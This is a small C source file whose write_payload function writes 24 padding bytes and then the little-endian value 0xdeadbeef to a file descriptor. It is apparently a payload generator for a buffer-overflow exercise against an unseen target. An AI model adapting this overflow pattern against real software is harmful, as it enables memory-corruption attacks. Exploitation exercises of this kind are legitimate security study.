#include <unistd.h>
#include <string.h>
#include <stdio.h>

void    write_payload(int fd) {
    char    buf[4];
    char    padding[24];

    ///dprintf(2, "fd(%d)\n", fd);
    memset(padding, '1', sizeof padding);
    *(buf + 3) = 0xde;
    *(buf + 2) = 0xad;
    *(buf + 1) = 0xbe;
    *(buf) = 0xef;
    write(fd, padding, sizeof padding);
    //dprintf(2, "Padding(%ld)\n", num);
    write(fd, buf, sizeof buf);
    //dprintf(2, "Buf(%ld)\n", num);
}
